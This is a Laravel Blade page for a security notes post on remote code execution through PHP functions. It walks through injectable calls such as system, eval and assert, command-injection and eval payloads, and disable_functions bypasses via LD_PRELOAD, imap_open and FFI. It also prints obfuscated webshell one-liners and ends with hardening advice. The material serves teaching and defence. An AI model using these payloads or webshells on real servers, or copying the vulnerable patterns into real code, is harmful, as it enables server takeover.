@extends('layouts.app')
@section('title', 'RCE via PHP Functions - Notes')
@section('content')
<style>
    @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap');
    :root{--bg:#0a0e17;--surface:#0f1522;--border:#1e2d45;--accent:#00c2ff;--accent2:#7b61ff;--text:#c9d8ef;--muted:#566a85;--green:#00e5a0;--red:#ff4d6d;--yellow:#f0b429;--orange:#ff9f43;}
    .post-root{background:var(--bg);font-family:'Syne',sans-serif;min-height:100vh;color:var(--text);}
    .post-topbar{border-bottom:1px solid var(--border);background:var(--surface);padding:12px 0;position:sticky;top:0;z-index:50;backdrop-filter:blur(8px);}
    .post-topbar-inner{max-width:960px;margin:0 auto;padding:0 32px;}
    .breadcrumb{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);flex-wrap:wrap;}
    .breadcrumb a{color:var(--muted);text-decoration:none;} .breadcrumb a:hover{color:var(--accent);} .breadcrumb-sep{opacity:.35;font-size:10px;} .breadcrumb-current{color:var(--text);}
    .post-body{max-width:960px;margin:0 auto;padding:48px 32px 100px;}
    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
    .article-card-inner{padding:48px;}
    .cat-badge{display:inline-flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:10px;padding:4px 12px;border-radius:3px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:24px;background:rgba(255,159,67,0.1);color:var(--orange);border:1px solid rgba(255,159,67,0.25);}
    .article-title{font-size:clamp(26px,4vw,38px);font-weight:800;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:20px;}
    .meta-row{display:flex;flex-wrap:wrap;gap:20px;margin-bottom:28px;padding-bottom:28px;border-bottom:1px solid var(--border);}
    .meta-item{display:flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);} .meta-item svg{width:13px;height:13px;}
    .read-btn{display:inline-flex;align-items:center;gap:8px;background:transparent;border:1px solid var(--border);border-radius:6px;padding:9px 18px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);cursor:pointer;transition:all .2s;margin-bottom:40px;} .read-btn:hover{border-color:var(--orange);color:var(--orange);}
    .article-prose{line-height:1.8;font-size:15px;color:var(--text);}
    .article-prose h2{font-size:24px;font-weight:800;color:#fff;margin:48px 0 20px;}
    .article-prose h3{font-size:18px;font-weight:700;color:var(--orange);margin:40px 0 16px;font-family:'IBM Plex Mono',monospace;display:flex;align-items:center;gap:10px;} .article-prose h3::before{content:'//';color:var(--accent2);font-size:14px;opacity:.7;}
    .article-prose p{margin-bottom:16px;} .article-prose strong{color:#fff;} .article-prose a{color:var(--accent);text-decoration:underline;}
    .article-prose ul{list-style:none;padding:0;margin-bottom:20px;display:flex;flex-direction:column;gap:10px;} .article-prose ul li{padding-left:20px;position:relative;} .article-prose ul li::before{content:'›';position:absolute;left:0;color:var(--orange);font-size:16px;line-height:1.6;}
    .article-prose pre{background:#060a12;border:1px solid var(--border);border-radius:8px;padding:20px 24px;overflow-x:auto;margin:24px 0;position:relative;} .article-prose pre code{font-family:'IBM Plex Mono',monospace;font-size:13px;color:#00e5a0;background:none;padding:0;}
    .article-prose code{font-family:'IBM Plex Mono',monospace;font-size:13px;background:rgba(255,159,67,0.08);color:var(--orange);padding:2px 7px;border-radius:3px;border:1px solid rgba(255,159,67,0.2);}
    .copy-code{position:absolute!important;top:10px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);padding:4px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;} .copy-code:hover{border-color:var(--orange);color:var(--orange);} .copy-code.copied{border-color:var(--green);color:var(--green);}
    .callout{border-radius:8px;padding:18px 22px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;} .callout-icon{font-size:18px;flex-shrink:0;margin-top:2px;} .callout p{margin:0;font-size:14px;line-height:1.7;} .callout strong{font-weight:700;}
    .callout-warning{background:rgba(240,180,41,0.06);border:1px solid rgba(240,180,41,0.25);} .callout-warning p{color:#f5d67a;} .callout-warning strong{color:var(--yellow);}
    .callout-info{background:rgba(255,159,67,0.05);border:1px solid rgba(255,159,67,0.2);} .callout-info p{color:var(--text);} .callout-info strong{color:var(--orange);}
    .callout-success{background:rgba(0,229,160,0.05);border:1px solid rgba(0,229,160,0.25);} .callout-success p{color:#7ff3cd;} .callout-success strong{color:var(--green);}
    .callout-danger{background:rgba(255,77,109,0.05);border:1px solid rgba(255,77,109,0.25);} .callout-danger p{color:#ffb3c0;} .callout-danger strong{color:var(--red);}
    @media(max-width:768px){.post-body{padding:24px 16px 60px;}.article-card-inner{padding:24px;}.post-topbar-inner{padding:0 16px;}}
</style>

<div class="post-root">
    <div class="post-topbar"><div class="post-topbar-inner">
        <nav class="breadcrumb">
            <a href="{{ route('home') }}">Home</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}">Notes</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}?category=php">PHP Security</a><span class="breadcrumb-sep">›</span>
            <span class="breadcrumb-current">RCE via PHP Functions</span>
        </nav>
    </div></div>

    <div class="post-body"><div class="article-card"><div class="article-card-inner">
        <div><span class="cat-badge">PHP Security</span></div>
        <h1 class="article-title">Remote Code Execution via PHP Functions</h1>
        <div class="meta-row">
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Youssef</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>{{ now()->format('d M Y') }}</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>0 views</div>
        </div>
        <button id="read-btn" class="read-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>Read Aloud</button>

        <div class="article-prose" id="article-content">

            <h2>Remote Code Execution via PHP Functions</h2>

            <h3>Command Execution Functions</h3>
            <p>PHP provides multiple functions that directly execute OS commands. Any user-controlled input reaching these functions without proper sanitization results in OS command injection.</p>
            <pre><code>// All these execute OS commands and are vulnerable if input is unsanitized:
system("ping " . $_GET['host']);           // prints output
exec("nslookup " . $_POST['domain']);      // returns last line
passthru("traceroute " . $_GET['ip']);     // raw binary output
shell_exec("curl " . $_GET['url']);        // returns all output as string
`cat /etc/passwd`;                          // backtick operator

// Exploitation:
?host=127.0.0.1; id          // command chaining with ;
?host=127.0.0.1 | id         // piping
?host=127.0.0.1 && id        // AND
?host=127.0.0.1 `id`         // subshell via backtick
?host=$(id)                   // subshell via $()
?host=127.0.0.1%0aid          // newline injection</code></pre>

            <h3>Code Evaluation — eval()</h3>
            <p><code>eval()</code> executes a string as PHP code. It is the most direct path to RCE when user input is passed to it.</p>
            <pre><code>// VULNERABLE
eval($_POST['code']);
eval("return " . $_GET['calc'] . ";");

// Payload: code=system('id');
// Payload: code=phpinfo();
// Payload: code=file_put_contents('/var/www/html/shell.php','<?php system($_GET[c]);?>');</code></pre>

            <h3>assert() as a Code Executor</h3>
            <p>In PHP 5 and early PHP 7, <code>assert()</code> evaluates its argument as PHP code if it's a string. This is a common bypass for WAFs filtering <code>eval()</code>.</p>
            <pre><code>// VULNERABLE (PHP < 8)
assert($_POST['test']);
assert("strlen('" . $_GET['input'] . "') > 0");

// Bypass via string:
?test=system('id')
?input=') system('id'); //</code></pre>

            <h3>preg_replace() with /e Modifier (PHP < 7.0)</h3>
            <p>The <code>/e</code> modifier in <code>preg_replace()</code> caused the replacement to be evaluated as PHP code. This was removed in PHP 7.0 but still appears in legacy code.</p>
            <pre><code>// VULNERABLE — PHP 5 only
preg_replace('/' . $_GET['pattern'] . '/e', $_GET['replace'], $subject);

// Payload: pattern=.* & replace=system('id')
// The replacement is eval'd → RCE</code></pre>

            <h3>Variable Functions & call_user_func()</h3>
            <pre><code>// Variable functions — if function name comes from user
$func = $_GET['action'];
$func($_GET['arg']);            // e.g. ?action=system&arg=id

// call_user_func — same risk
call_user_func($_GET['func'], $_GET['arg']);
call_user_func_array($_POST['func'], $_POST['args']);

// create_function() — deprecated, acts like eval
$f = create_function('', $_POST['code']);
$f();</code></pre>

            <h3>disable_functions Bypass</h3>
            <p>Many servers set <code>disable_functions</code> in php.ini to block dangerous functions. Common bypass techniques:</p>
            <pre><code>// Check what's disabled:
print_r(explode(',', ini_get('disable_functions')));

// Bypass techniques:

// 1. LD_PRELOAD trick (via mail() if not disabled)
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@b.com", "", "", "");

// 2. imap_open() — execute commands via shell metacharacters
imap_open("{127.0.0.1:143/imap}INBOX", "x -oProxyCommand=id", "");

// 3. pcntl_exec() — if enabled
pcntl_exec("/bin/bash", ["-c", "id"]);

// 4. FFI (PHP 8+ foreign function interface)
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id > /tmp/out");

// Automate with FuckFastcgi / Chankro tools</code></pre>

            <h3>PHP Webshells — One-liners to Know</h3>
            <pre><code><?php system($_GET['c']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php @eval($_POST['x']); ?>
<?php passthru(base64_decode($_GET['c'])); ?>

// Obfuscated (bypass simple WAFs)
<?php $f='sys'.'tem'; $f($_GET['c']); ?>
<?php call_user_func(base64_decode('c3lzdGVt'), $_GET['c']); ?></code></pre>

            <h3>Prevention</h3>
            <pre><code>// php.ini hardening
disable_functions = system,exec,passthru,shell_exec,popen,proc_open,eval,assert
open_basedir = /var/www/html

// Never pass user input to dangerous functions
// If you need to run commands, use escapeshellarg():
$host = escapeshellarg($_GET['host']);
system("ping -c 1 $host");  // much safer but ideally avoid entirely

// Prefer dedicated libraries over shell commands
// e.g. use GD for image processing, not exec("convert ...")</code></pre>

            <div class="callout callout-success">
                <div class="callout-icon">✅</div>
                <p><strong>Key Takeaway:</strong> The only truly safe approach is to never pass user input to code/command execution functions. If system interaction is required, use <code>escapeshellarg()</code> and <code>escapeshellcmd()</code> as a minimum, and restrict via <code>disable_functions</code> and <code>open_basedir</code>.</p>
            </div>

        </div>
    </div></div></div>
</div>
@endsection
@section('scripts')
<script>
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('pre').forEach(pre=>{pre.style.position='relative';const btn=document.createElement('button');btn.className='copy-code';btn.textContent='copy';pre.appendChild(btn);btn.addEventListener('click',()=>{const code=pre.querySelector('code')?.textContent??pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);});});});const r=document.getElementById('read-btn');const c=document.getElementById('article-content');if(r&&c){let reading=false;r.addEventListener('click',()=>{if(!reading){const u=new SpeechSynthesisUtterance(c.innerText);u.lang='en-US';speechSynthesis.speak(u);reading=true;r.textContent='Stop';u.onend=()=>{reading=false;r.textContent='Read Aloud'};}else{speechSynthesis.cancel();reading=false;r.textContent='Read Aloud';}});}});
</script>
@endsection
